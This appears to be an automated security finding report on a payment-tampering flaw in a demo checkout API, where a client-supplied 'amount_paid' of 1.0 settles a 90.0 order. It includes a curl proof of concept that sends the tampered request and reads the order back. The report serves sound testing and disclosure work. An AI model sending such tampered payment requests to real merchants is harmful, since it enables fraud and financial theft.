# Payment Tampering — settlement below amount due

**Finding ID:** `AP-AB4D2C41`  
**Severity:** Critical  
**Impact class:** Financial Loss / Payment Tampering  
**Effect-class:** `PAYMENT`  
**Endpoint:** `POST /api/checkout`  
**Classification source:** contract

## Summary
The action violates the conservation law **PAYMENT: amount_paid ≥ amount_due ∧ paid-state terminal**, which is true by the definition of the `PAYMENT` effect-class. The violation was **confirmed by proven Δstate**, not a status-code diff.

## Causal path (proof)
1. Principal 'B' issued POST /api/checkout and received 200.
2. EIL law violated → PAYMENT: amount_paid ≥ amount_due ∧ paid-state terminal: amount_paid=1.0 < amount_due=90.0 on a successful payment — value-conservation law violated
3. Confirmed by Δstate via authenticated read-back of order settlement state: BEFORE [amount_due = 90.0] → AFTER [order settled (paid) with amount_paid = 1.0 (shortfall 89.0)] (read back as 'B').

## Proof of Δstate
```
method : authenticated read-back of order settlement state
before : amount_due = 90.0
after  : order settled (paid) with amount_paid = 1.0 (shortfall 89.0)
read as: B
detail : order reached terminal paid state below the amount due
```

## Reproduction (PoC)
1. As 'B', send: POST /api/checkout with body {"order_id": "202", "amount_due": 90.0, "amount_paid": 1.0}
2. Observe the privileged effect succeed (200).
3. As the legitimate owner 'B', read the state back to confirm the change/leak persisted.

```bash
curl -X POST 'https://demo.local/api/checkout' -H 'Authorization: Bearer $TOKEN_B' -H 'Content-Type: application/json' -d '{"order_id": "202", "amount_due": 90.0, "amount_paid": 1.0}'
curl -X GET 'https://demo.local/api/orders/202' -H 'Authorization: Bearer $TOKEN_B'
```

> Replace $TOKEN_<pid> with each principal's session credential. Run only within authorised program scope.

## Impact
Financial Loss / Payment Tampering.
